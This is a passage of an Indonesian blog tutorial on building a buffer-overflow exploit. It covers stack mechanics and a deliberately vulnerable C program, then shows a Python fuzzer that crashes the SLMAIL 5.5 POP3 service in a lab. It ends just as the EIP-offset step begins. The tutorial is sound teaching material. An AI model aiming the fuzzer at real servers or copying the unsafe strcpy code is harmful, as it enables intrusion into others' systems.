 memory segment), Sistem Operasi mengalokasikan sebagian ruang memory 
ini untuk digunakan sebagai ruang “kerja” aplikasi atau sebagai “ruang 
corat-coret”. Ruang memory ini disebut dengan istilah STACK. Sistem 
Operasi mengalokasikan STACK untuk setiap “thread” di aplikasi dan 
menghapusnya saat “thread” tersebut dihentikan.</p>

<p>Singkat kata, STACK adalah ruang memory di segment “userland” yang 
dimanfaatkan oleh “thread” di aplikasi untuk menyimpan data seperti 
local variable, nilai register dan data lainnya. Saat suatu fungsi pada 
aplikasi akan dieksekusi, sebuah ruang atau blok (STACK FRAME) 
dialokasikan didalam STACK yang kemudian digunakan oleh fungsi tersebut 
untuk menyimpan data variable termasuk “user input”.</p>

<p><strong>Ukuran STACK</strong> ditentukan dan dialokasikan saat awal pembentukannya dan <strong>tidak akan berubah</strong>
 selama thread yang memiliki STACK ini masih berjalan. Namun demikian, 
ukuran STACK FRAME yang berada di dalam STACK bersifat dinamis dan 
dialokasikan sesuai dengan kebutuhan sub-routine atau function.</p>

<p>STACK bekerja dengan prinsip urutan LIFO (Last In FIrst Out). 
Artinya, data terakhir yang tersimpan dalam STACK saat instruksi PUSH 
dieksekusi oleh CPU, akan menjadi data pertama yang dikeluarkan dari 
STACK saat instruksi POP dieksekusi oleh CPU.</p>

<p>Mengacu kepada pembahasan kita sebelumnya mengenai register, ESP 
(Extended Stack Pointer) adalah register yang bertugas sebagai petunjuk 
lokasi STACK pada saat CPU mengeksekusi Instruksi (lokasi STACK in real 
time). Lokasi ini tentunya dinyatakan dalam bentuk alamat RAM (dalam 
format HEX kalau kita melihatnya di debugger). Dalam perjalan 
pengeksekusian instruksi, lokasi STACK frame pointer bisa berubah 
tergantung dengan instruksi yang telah dijalankan oleh CPU.</p>

<p>STACK dialokasikan oleh Sistem Operasi di alamat memory yang tinggi 
(high memory address) dan berkembang/tumbuh ke alamat memory yang rendah
 (lower memory address). Saat data di PUSH atau disimpan ke STACK, ESP 
(stack pointer) akan mengurangi alamat memory sebesar data yang di PUSH 
sehingga pointer menunjukan lokasi baru atau ruang kosong dalam STACK 
yang kemudian dapat digunakan oleh instruksi berikutnya. Apabila 
instruksi POP (mengeluarkan data dari STACK) dieksekusi oleh CPU, maka 
ESP (stack pointer) akan menambah alamat memory sebesar data yang 
dikeluarkan sehingga pointer menunjukan lokasi data sebelumnya. Sekali 
lagi ini terjadi karena STACK membesar ke alamat memory yang lebih 
rendah.</p>

<p>Berikut ini diagram balok yang menggambarkan STACK yang berkembang/tumbuh ke alamat memory yang rendah</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/ilustrasi-STACK.jpg" class="align-center" alt="install gpg"></p>

<p>Seperti yang kita bahas sebelumnya, setiap PUSH ke STACK (menyimpan 
nilai/data ke STACK), nilai di ESP (Extended Stack Pointer) dikurangi 
karena STACK berkembang ke arah alamat memory yang lebih kecil. 
Pengurangan ini tergantung besarnya nilai/data yang di-PUSH. Misalnya, 
saat EIP disimpan ke STACK FRAME, register ESP akan dikurangi dengan 4 
byte (4 * 8 bit =32 bit). Hal ini wajar karena nilai yang ada di EIP 
adalah alamat memory yang panjangnya adalah 32-bit.</p>

<p>Tanpa menghabiskan waktu membahas proses STACK, STACK FRAME dan juga 
hal lainnya seperti HEAP, mari kita langsung menganalisa terjadinya 
buffer overflow dari aspek STACK.</p>

<h3 id="terjadinya-buffer-overflow-">Terjadinya Buffer Overflow <a name="terjadinya-buffer-overflow"></a></h3>

<p>Seperti pembahasan kita sebelumnya, buffer overflow terjadi karena 
aplikasi mencoba menyimpan data ke bagian memory (BUFFER yang tersimpan 
di STACK) melebihi kapasitas yang telah dialokasikan sehingga proses 
penyimpanan tersebut menimpa (meng-overwrite) data lainnya yang 
tersimpan di lokasi memory yang berada disebelahnya seperti EIP dan EBP.
 Karena EIP menyimpan lokasi memory yang memiliki instruksi selanjutnya 
yang harus dieksekusi oleh CPU dan nilai ini telah ter-timpa, maka 
aplikasi akan berhenti bekerja (Hang atau Crash).</p>

<p>Mari kita analisa buffer overflow menggunakan debugger. Sebelum mulai
 bereksperimen, download dan instal sistem operasi dan aplikasi berikut.</p>

<ol>
  <li>Siapkan windows XP atau windows 7 (Bisa menggunakan VMWARE). Saya 
tidak bisa memberikan download link karena Sistem Operasi ini tidak 
gratis.<br><br></li>
  <li>Download dan Install immunity debugger. Untuk mendapatkannya, bisa langsung download dari <a href="http://debugger.immunityinc.com/ID_register.py">http://debugger.immunityinc.com/ID_register.py</a></li>
  <li>Download dan Install KALI LINUX di <a href="http://cdimage.kali.org/kali-1.0.9a/kali-linux-1.0.9a-i386.iso">http://cdimage.kali.org/kali-1.0.9a/kali-linux-1.0.9a-i386.iso</a> apabila anda memiliki vmware, bisa gunakan vm image KALI yang tersedia di <a href="http://images.offensive-security.com/kali-linux-1.0.9-vm-i686.7z">http://images.offensive-security.com/kali-linux-1.0.9-vm-i686.7z</a> agar bisa langsung digunakan tanpa instalasi.</li>
</ol>

<p>Setelah semua terinstal, buat dan compile program C berikut 
menggunakan i586-mingw32msvc-gcc yang telah tersedia di KALI LINUX. 
Program ini memang sengaja dibuat rentan terhadap buffer overflow agar 
mudah dianalisa. Langkah selanjutnya sudah saya dokumentasikan dalam 
video untuk mempermudah anda dalam mengikuti keseluruhan tutorial.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;string.h&gt;
</span>
<span class="c1">//fungsi atau sub-routine yang digunakan untuk meng-copy data dari user ke variable sementara</span>

<span class="kt">void</span> <span class="nf">FungsiCopyString</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">InputDariUser</span><span class="p">)</span>
<span class="p">{</span>

        <span class="kt">char</span> <span class="n">TempVar</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span> <span class="c1">//declare variable sementara sebesar 64 byte yang akan menampung data dari user</span>
        <span class="n">strcpy</span><span class="p">(</span><span class="n">TempVar</span><span class="p">,</span><span class="n">InputDariUser</span><span class="p">);</span>  <span class="c1">//lakukan copy data dari user ke variable sementara</span>
<span class="p">}</span>

<span class="c1">//fungsi utama yang akan dieksekusi pertama kali saat program dijalankan </span>

<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>

        <span class="n">FungsiCopyString</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span> <span class="c1">//panggil fungsi copy string dan sertakan argumen input data dari user</span>
<span class="p">}</span></code></pre></figure>

<p>Berikut ini video bagaimana cara meng-compile aplikasi diatas. Agar 
text di video terbaca, gunakan HD di setting video yang tersedia di menu
 youtube.</p>

<div style="text-align:center">
  <iframe src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/gRjUR8Gxco0.html" allowfullscreen="" width="640" height="480" frameborder="0"></iframe>
</div>

<p>Program sederhana ini memanggil sub-routine atau fungsi yang ada 
diatasnya untuk memproses argument/input dari user. Proses yang 
dilakukan oleh sub-routine ini tidak lain hanya meng-copy argument/input
 yang diberikan oleh user ke variable atau buffer yang besarnya 64 byte.
 Apabila operasi copy telah berhasil dilaksanakan, sub-routine/function 
akan menyerahkan kembali pekerjaan selanjutnya ke function utama (main).
 Penyerahan kembali ini dilakukan dengan mengembalikan (me-restore) 
nilai EIP yang disimpan dalam STACK ke register EIP.</p>

<p>Untuk melihat proses diatas, compile program di KALI LINUX dan 
kemudian jalankan di mesin windows XP dengan memberikan argument atau 
input. Program akan berjalan dengan baik apabila argument/input yang 
diberikan tidak melebihi 64 byte (1 karakter ascii besarnya 1 byte atau 8
 bit dan dapat dinyatakan dalam HEX mulai dari \x00 sampai \xff) . 
Referensi mapping HEX dan ascii dapat dilihat di <a href="http://www.ascii-code.com/">http://www.ascii-code.com</a></p>

<p>Apabila program diberikan argument/input melebihi 64 byte (misalnya 
dengan memberikan huruf C sebanyak 80 karakter), maka program akan hang 
atau crash. Hal ini terjadi karena argument yang besarnya melibihi 
kapasitas ruang memory (buffer) yang disediakan telah menimpa 
(meng-overwrite) data penting yang tersimpan dalam buffer tersebut. 
Salah satu data penting yang tersimpan dalam buffer adalah EIP (Extended
 Instruction Pointer). Dengan hilangnya data EIP, CPU tidak lagi bisa 
mengeksekusi instruksi berikutnya karena tidak mengetahui lokasi 
instruksi tersebut disimpan.</p>

<p>Untuk melihat proses overwrite ini, kita akan menganalisa assembly 
code milik subroutine/function yang melakukan peng-copy-an argument ke 
variable(buffer). Untuk menganalisis ini, kita akan menggunakan immunity
 debugger. Bagi yang belum pernah menggunakan immunity debugger, bisa 
melihat video berikut ini.</p>

<p>Agar text di video terbaca, gunakan HD di setting video yang tersedia di menu youtube.</p>

<div style="text-align:center">
  <iframe src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/7GO9UrUFVBI.html" allowfullscreen="" width="640" height="480" frameborder="0"></iframe>
</div>

<p>Mari kita teliti lebih dalam assembly code milik sub-routine/fuction 
FungsiCopyString, yang bertugas melakukan peng-copy-an argument/input ke
 variable/buffer TempVar. Kita tertarik dengan sub-routine ini karena 
kita sudah mengetahui bahwa program hang atau crash saat memproses 
argument yang besarnya melebihi ruang memory atau buffer yang telah 
disediakan. Untuk mengidentifikasi assembly code milik 
subroutine/function ini, kita akan cari instruksi assembly yang 
melakukan string copy atau strcpy dan diawali dengan instruksi PUSH EBP 
dan MOV EBP,ESP.</p>

<p>Perlu diketahui bahwa biasanya eksekusi suatu sub-routine atau function diawali dengan instruksi seperti <span style="color:red"><strong>PUSH EBP</strong></span> yang kemudian dilanjutkan dengan <span style="color:red"><strong>MOV EBP,ESP</strong></span></p>

<p>Sekilas saja mengenai bahasa assembly, PUSH EBP ini artinya meng-copy
 apapun nilai yang ada di register EBP ke dalam STACK memory. Sementara 
perintah MOV EBP,ESP ini artinya meng-copy apapun nilai yang ada di 
register ESP ke register EBP.</p>

<p>Berikut ini block assembly dari sub-routine/function FUngsiCopyString.</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/str-copy-assembly.png" class="align-center" alt="install gpg"></p>

<p>Tidak perlu khawatir dengan bahasa assembly diatas karena kita hanya 
ingin melihat sekilas bagaimana suatu buffer bisa menimpa data penting 
seperti EIP (Extended Instruction Pointer) di memory. Dengan ter-timpa 
nya data EIP, maka kita sudah dapat mengkontrol alur eksekusi aplikasi 
karena CPU menggunakan register EIP (Extended Instruction Pointer) ini 
sebagai petunjuk lokasi instruksi yang berikutnya. Kita akan bahas lebih
 detail bagaimana kita bisa memanfaatkan kelemahan ini untuk 
menginstruksikan CPU agar mengeksekusi perintah yang kita inginkan.</p>

<p>Namun <strong>sebelum assembly code diatas dieksekusi</strong>, ada beberapa tahapan lainnya yang harus dieksekusi oleh CPU seperti yang telah dijelaskan pada bagian <strong>prilaku STACK</strong>. Berikut proses dan instruksi yang harus eksekusi oleh CPU:</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/sebelum-subroutine-dieksekusi.jpg" class="align-center" alt="install gpg"></p>

<p>Setelah tahapan diatas selesai, CPU mulai mengekseksui instruksi-instruksi milik sub-routine/function FungsiCopyString.</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/inisialisasi-sub-routine.jpg" class="align-center" alt="install gpg"></p>

<p>Setelah itu, CPU akan mengalokasiakan buffer atau ruang memory dengan instruksi <span style="color:red"><strong>SUB ESP,48</strong></span>
 (yang artinya kurangi nilai yang ada di ESP sebanyak 48 byte dalam HEX 
atau sama dengan 72 byte dalam bahasa kita)  untuk menyimpan hasil 
pemprosesan sub-routine atau function tersebut. Buffer ini yang nantinya
 akan menyimpan arguments/input dari kita sesuai dengan perintah yang 
kita buat di program yaitu memberikan ruang untuk variable TempVar 
sebesar 64 byte. Mungkin muncul pertanyaan, “kenapa assembly 
mengalokasikan ruang lebih besar yaitu 72 byte?”. Ini terjadi karena 
compiler memberikan ruang tambahan untuk kebutuhan eksekusi instruksi.</p>

<p>Seperti kita ketahui, saat CPU menyimpan data ke STACK dengan 
instruksi PUSH, maka nilai di register ESP (Extended STACK Pointer) akan
 dikurangi. Hal ini terjadi karena STACK membesar ke alamat memory yang 
lebih kecil seperti pembahasan kita sebelumnya. Sebaliknya, saat CPU 
mengeluarkan nilai dari STACK dengan instruksi POP, maka nilai register 
ESP akan ditambahkan sesuai dengan besar data yang dikeluarkan.</p>

<p>Berikut ini ilustrasi lokasi dan isi  STACK setelah prolog diatas selesai dieksekusi.</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/STACK-dalam-perjalanannya.jpg" class="align-center" alt="install gpg"></p>

<p>Setelah prolog atau instruksi inisialisasi selesai, program mulai 
meng-copy arguments/user input ke variable TempVar. Proses peng-copy-an 
ini tidak mengubah nilai STACK POINTER (ESP) karena dilakukan di ruang 
memory/Buffer yang telah dialokasikan saat inisialisasi. Karena proses 
pen-copy-an bukan merupakan operasi STACK (PUSH atau POP ESP), maka 
metode penyimpanan datanya dimulai dari <strong>alamat memory yang kecil</strong> dan membesar ke <strong>alamat memory yang lebih besar</strong>.
  Selain itu, operasi pen-copy-an tidak akan berhenti sebelum 
ditemukannya null byte (\X00) atau karakter kosong.  Permasalahan muncul
 saat kapasitas buffer telah penuh dan peng-copy-an masih berlanjut 
hingga akhir karakter argument sehingga proses tersebut mulai menimpa 
data di memory sebelahnya seperti EBP,EIP dan juga pointer argv[1]. 
Berikut ilustrasi proses peng-copy-an argument ke buffer.</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/EIP-ter-overwrite.jpg" class="align-center" alt="install gpg"></p>

<p>Mengacu kembali ke program kita, tugas sub-routine/function 
FungsiCopyString akan selesai setelah peng-copy-an argument/user input 
selesai dilakukan. Sub-routine/function yang telah selesai melakukan 
tugasnya akan mengembalikan instruksi selanjutnya ke fungsi yang 
memanggil. Di program kita, fungsi yang memanggil sub-routine 
FungsiCopyString adalah fungsi utama (main function).</p>

<p>Proses pengembalian ini dilakukan dengan memindahkan (restore) nilai 
EIP yang tersimpan di dalam STACK ke register EIP. Pemindahaan ini 
dieksekusi melalui instruksi assembly RET.</p>

<p>Apa yang terjadi berikutnya? nilai EIP yang di pindahkan (restore) 
dari STACK ke register adalah nilai yang telah ter-timpa (overwrite) 
dengan arguments yang kita berikan ke program yaitu karakter CCCC.</p>

<p>Register EIP kemudian menginformasikan CPU untuk mengeksekusi 
instruksi berikutnya yang tersimpan di alamat memory CCCC dimana alamat 
memory tersebut tidak ada (non-existance). Hasilnya? CPU bingung dan 
duarrr!!!! aplikasi crash.</p>

<p>Berikut adalah nilai ESP (Stack pointer) dan EIP selama proses diatas dieksekusi.</p>

<p>1.Alamat atau pointer tempat data argument/user input disimpan</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/ptr-to-arg1.png" class="align-center" alt="install gpg"></p>

<p>2.Nilai EIP (Extended Instruction Pointer) disimpan dalam STACK</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/EIP.png" class="align-center" alt="install gpg"></p>

<p>3.Nilai EBP disimpan dalam STACK</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/EBP.png" class="align-center" alt="install gpg"></p>

<p>4.Buffer dialokasikan untuk variable TempVar sebesar 48 byte dalam HEX atau 72 byte dalam hitungan kita (base 10)</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/Buffer.png" class="align-center" alt="install gpg"></p>

<p>5.Saat sub-routine/function FungsiCopyString selesai, EIP 
dikembalikan (di-restore) dengan nilai yang sudah tertimpa yaitu dengan 
karakter C atau dalam HEX \x43</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/EIP-now-overwritten.png" class="align-center" alt="install gpg"></p>

<p>6.Program CRASH!!!!!!</p>

<p>Dari kejadian ini, kita mengetahui bahwa nilai EIP yang tersimpan di 
STACK dapat ditimpa (di-overwrite) dengan arguments/input yang kita 
berikan. Fakta ini akan memuncukan pertanyaan berikut:</p>

<ol>
  <li>
    <p>Bagaimana kalau kita timpa nilai EIP ini dengan alamat memory yang menyimpan instruksi yang telah kita injeksi?</p>
  </li>
  <li>
    <p>Apakah CPU akan meng-eksekusi instruksi di alamat memory yang kita berikan tersebut?</p>
  </li>
  <li>
    <p>Bagaimana kalau instruksi yang kita sisipkan ke memory tersebut 
merupakan program yang memberikan kita hak akses ke sistem operasi 
berupa shell?</p>
  </li>
</ol>

<p>Pertanyaan diatas adalah salah satu tujuan utama kita mengexploitasi 
kerentanan buffer overflow. Kita akan praktekan konsep ini pada aplikasi
 yang sebenarnya.</p>

<p>Semoga anda belum mengantuk dan berikut video singkat yang 
menjelaskan proses diatas. Agar text di video terbaca, gunakan HD di 
setting video yang tersedia di menu youtube.</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/youtube-hd.png" class="align-center" alt="install gpg"></p>

<div style="text-align:center">
  <iframe src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/g0H4sk99jHk.html" allowfullscreen="" width="640" height="480" frameborder="0"></iframe>
</div>

<h3 id="mengidentifikasi-kerentanan-buffer-overflow-">Mengidentifikasi kerentanan Buffer Overflow <a name="mengidentifikasi-buffer-overflow"></a></h3>

<p>Mari kita sudahi pembahasan teori yang membosankan dan langsung 
melihat aplikasi sungguhan yang rentanan terhadap buffer overflow. Kali 
ini kita akan analisa mail server bernama SLMAIL 5.5.</p>

<p>Kerentanan buffer overflow pada aplikasi ini sudah teridentifikasi 
sejak lama dan menurut saya kasus pada aplikasi ini sangat bagus untuk 
dijadikan contoh pembahasan pengenalan buffer overflow karena tergolong 
mudah untuk di-ekploitasi.</p>

<p>Halaman <a class="vglnk" href="http://exploit-db.com/" rel="nofollow"><span>exploit</span><span>-</span><span>db</span><span>.</span><span>com</span></a> telah menyediakan kode(code) untuk meng-exploitasi kerentanan ini dan bisa dilihat di <a href="http://www.exploit-db.com/exploits/646/">http://www.exploit-db.com/exploits/646/</a>. Selain itu, terdapat beberapa versi kode exploitasi lainnya yang bisa digunakan di <a href="http://goo.gl/GcMvrJ">tautan berikut</a></p>

<blockquote>
  <p>Namun, pada kesempatan ini, kita tidak akan menggunakan kode-kode 
exploitasi yang ada karena kita akan membuatnya sendiri. Ya, justru 
tujuan utama dari tutorial ini adalah bagaimana kita menganalisa 
kerentanan dan kemudian membuat exploitnya.</p>
</blockquote>

<p>Sebelum kita mulai, pastikan anda lakukan berikut:</p>

<ol>
  <li>
    <p>Download aplikasi SLMAIL 5.5 di halaman <a href="http://goo.gl/1vBmGJ">exploit-db</a>
 dan kemudian install aplikasi tersebut di windows XP atau windows 7. 
Tutorial ini menggunakan window XP sehingga nilai return address atau 
EIP akan berbeda di sistem operasi selain XP</p>
  </li>
  <li>
    <p>Download atau clone MONA (immunity debugger extension) di github <a href="https://github.com/corelan/mona">https://github.com/corelan/mona</a></p>
  </li>
  <li>
    <p>Instal MONA dengan meng-copy script mona.py ke folder C:\Program 
Files\Immunity Inc\Immunity Debugger\PyCommands di Windows XP anda</p>
  </li>
</ol>

<p>Kerentanan di SLMAIL 5.5. terletak pada layanan POP3 dimana layanan 
ini akan berprilaku tidak normal (hang) setelah menerima dan memproses 
input password yang sangat panjang. Ikuti langkah berikut secara 
berurutan untuk melihat setiap fase yang dilalui oleh aplikasi SLMAIL 
sampai akhirnya crash (hang)</p>

<h4 id="i-fuzzing">i. Fuzzing</h4>

<p>Untuk mengetahui seberapa panjang password yang membuat layanan POP3 
SLMAIL 5.5 hang, kita akan coba mengirim sejumlah password dengan 
panjang yang bervariasi. Metode ini dikenal dengan istilah fuzzing atau 
upaya mengirim data secara acak (random) dengan harapan aplikasi crash 
(hang) saat memproses data tersebut. Saat aplikasi crash (hang) kita 
punya kesempatan untuk menganalisa penyebabnya dan kemudian 
mengexploitasinya apabila memungkinkan.</p>

<p>Sebelum kita memulai, pastikan SLMAIL telah berjalan dengan baik di 
windows XP dan kemudian “attach” proses POP3 SLMAIL ke imunity debugger.
 Setelah itu pastikan immunity debugger menjalankan proses tersebut. 
Berikut cara attach proses di immunity debugger.</p>

<p>Klik Immunity debugger –&gt; File –&gt; Attach –&gt; SLMAIL yang 
menjalankan port TCP 110 –&gt; klik Attach seperti gambar dibawah ini</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/Screen-Shot-2014-12-16-at-1.png" class="align-center" alt="install gpg"></p>

<p>Setelah itu jangan lupa untuk klik PLAY di tombol atas agar debugger tidak memberhentikan prosesnya.</p>

<p>Ada dua cara dalam melakukan fuzzing, yaitu:</p>

<p>1.Cara Manual</p>

<p>Menggunakan netcat di kali linux, kita dapat berkomunikasi dengan 
layanan POP3 dan kemudian mengirim sejumlah password dengan panjang yang
 berbeda-beda. Setiap mengirim password, kita perhatikan debugger untuk 
melihat kondisi layanan POP3. Lakukan pengiriman sejumlah password 
sampai akhirnya layanan POP3 hang(crash). Berikut ini contoh penggunaan 
netcat dari kali linux ke SLMAIL yang berjalan di windows XP dengan IP 
172.16.192.130</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/netcat-slmail-pop3.png" class="align-center" alt="install gpg"></p>

<p>2.Cara Otomatis</p>

<p>Dengan sedikit script python, kita bisa meng-otomasi proses diatas. 
Script berikut ini melakukan iterasi dan mengirim karakter “C” sebagai 
password dengan panjang yang bervariasi. kita mulai dengan panjang 
password 1 byte (1 karakter “C”) dan kemudian dengan panjang 100 byte 
dan penambahan 200 byte untuk setiap password yang dikirim. Jalankan 
script ini dengan mengetik python nama_scriptnya</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>

<span class="kn">import</span> <span class="nn">socket</span>

<span class="n">password_array</span><span class="o">=</span><span class="p">[</span><span class="s">"C"</span><span class="p">]</span>    <span class="c">#Array untuk menyimpan karakter "C" sebagai password yang akan dikirim ke layanan POP3</span>
<span class="n">array_counter</span><span class="o">=</span><span class="mi">1</span>         <span class="c">#Penghitung jumlah array saat iterasi untuk mengisi array dengan password</span>
<span class="n">password_length</span><span class="o">=</span><span class="mi">100</span>     <span class="c">#Bilangan penambahan jumlah password yang dibuat</span>

<span class="k">while</span> <span class="n">array_counter</span><span class="o">&lt;=</span><span class="mi">40</span><span class="p">:</span>        <span class="c">#iterasi sampai array mencapai 40 baris</span>

        <span class="n">password_array</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">"C"</span><span class="o">*</span><span class="n">password_length</span><span class="p">)</span> <span class="c"># isi array dengan karakter "C" sbagai password dengan panjang sesuai bilangan</span>

        <span class="n">password_length</span><span class="o">=</span><span class="n">password_length</span><span class="o">+</span><span class="mi">200</span>     <span class="c">#tambahkan bilangan jumlah password</span>
        <span class="n">array_counter</span><span class="o">=</span><span class="n">array_counter</span><span class="o">+</span><span class="mi">1</span>           <span class="c">#tambahkan penghitung jumlah array</span>

<span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">password_array</span><span class="p">:</span> <span class="c">#iterasi isi array dan kemudian kirim isi tersebut sebagai password</span>

        <span class="k">print</span> <span class="s">"Mengirim password sebesar </span><span class="si">%</span><span class="s">s byte</span><span class="se">\n\n</span><span class="s">"</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
        <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>      <span class="c">#definisikan koneksi TCP/IP soket</span>

        <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">Berkomunikasi dengan POP3.....</span><span class="se">\n</span><span class="s">"</span>
        <span class="n">connect</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'172.16.192.130'</span><span class="p">,</span><span class="mi">110</span><span class="p">))</span>       <span class="c">#Koneksi ke POP3 server</span>
        <span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>                               <span class="c">#pesan balasan dari server</span>
        <span class="k">print</span> <span class="n">data</span>                                      <span class="c">#print ke layar supaya kita tau statusnya</span>

        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'USER adinanta</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>                     <span class="c">#kirim username adinanta (username apa aja bisa)</span>
        <span class="n">data</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>                               <span class="c">#pesat balasan server</span>
        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'PASS '</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="s">'</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>                 <span class="c">#kirim string password ke server</span>
        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'QUIT</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>                              <span class="c">#keluar dari komunikasi pop3</span>
        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>                                       <span class="c">#putus tcp/ip connection</span></code></pre></figure>

<p>Setelah fuzzing dilakukan, kita berhasil mengidentifikasi bahwa POP3 
crash(hang) saat mulai memproses password dengan panjang  3100 byte. Hal
 ini bisa kita lihat di immunity debugger dimana nilai EIP telah 
tertimpa dengan HEX \x43 atau karakter “C” dalam ASCII.  Berikut 
tampilan debugger saat SLMAIL POP3 crash</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/slmail-crash.png" class="align-center" alt="install gpg"></p>

<p>Berikut video singkat yang menjelaskan proses diatas. Agar text di 
video terbaca, gunakan HD di setting video yang tersedia di menu 
youtube.</p>

<div style="text-align:center">
  <iframe src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/D3tYk9YWJ4U.html" allowfullscreen="" width="640" height="480" frameborder="0"></iframe>
</div>

<h4 id="ii-mencari-lokasi-eip-yang-tertimpa">ii. Mencari lokasi EIP yang tertimpa</h4>

<p>Seperti pembahasan kita sebelumnya, tugas register Extended 
Instruction Pointer (EIP) adalah memberi CPU petunjuk lokasi instruksi 
yang harus dieksekusi selanjutnya. Saat instruksi yang ada di 
sub-routine/function selesai dieksekusi, CPU harus melanjutkan kembali 
instruksi utama yang memanggil sub-routine/function tersebut. Alamat 
atau lokasi instruksi ini disimpan dalam STACK dan dikembalikan 
(di-restore) ke register EIP setelah sub-routine/function teah selesai 
dieksekusi.</p>

<p>Pada kasus SLMAIL POP3 diatas, <strong>nilai EIP telah tertimpa dengan karakter password yang kita kirim</strong> dan hal ini terjadi saat kita mengirim password yang panjangnya 3100 byte.</p>

<p>Dalam kata lain, kita bisa memberikan nilai EIP sesuai dengan 
keinginan kita dengan menyisipi nilai EIP ke dalam bagian password yang 
kita kirim. Karena kita bisa memberikan nilai EIP, maka otomatis kita 
bisa kontrol alur eksekusi CPU.</p>

<p>Kondisi ini dapat kita manfaatkan dengan menyuruh CPU untuk 
mengeksekusi instruksi yang kita berikan dan bukan instruksi yang ada di
 SLMAIL. Instruksi ini bisa berupa shell yang memberikan kita hak akses 
ke sistem operasi (OS) yang menjalankan SLMAIL.</p>

<p>Untuk itu, kita perlu mengetahui di karakter password yang keberapa 
nilai EIP ini tertimpa (ter-overwrite). Berikut langkah yang kita akan 
lakukan:</p>

<p>1.Mengirim karakter unik sepanjang 3100 byte sebagai password. Kita 
akan menggunakan program pattern_create.rb dari metasploit untuk membuat
 karakter ini. Setelah itu kita akan modifikasi program fuzzing kita 
untuk mengirim karakter ini sebagai password. Ikuti langkah berikut 
untuk membuat pattern dan kemudian gunakan program fuzzing kita yang 
sudah dimodifikasi untuk mengirim pattern ini sebagai password.</p>

<p>a.Dari shell kali linux ketik /usr/share/metasploit-framework/tools/pattern_create.rb 3100</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/pattern_create.png" class="align-center" alt="install gpg"></p>

<p>b.Modifikasi program fuzzing dan jadikan hasil pattern diatas sebagai password. Setelah itu jalankan kembali</p>

<figure class="highlight"><pre><code class="language-pyhon" data-lang="pyhon">#!/usr/bin/python

import
 socket

